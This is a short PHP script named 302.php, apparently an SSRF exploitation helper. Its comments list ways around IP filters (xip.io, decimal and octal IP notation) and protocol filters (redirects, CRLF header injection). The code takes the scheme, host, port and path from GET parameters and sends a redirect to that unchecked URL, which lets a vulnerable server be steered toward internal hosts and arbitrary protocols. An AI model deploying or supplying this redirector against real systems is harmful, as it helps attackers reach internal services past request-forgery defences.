// Helper script 302.php—bypass http protocol restrictions
// IP restriction bypass (xip.io, decimal IP, octal IP)
// Protocol restriction bypass (Redirect, CRLF header injection)
// Invoking system-supported protocols and methods

<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data"); ?>
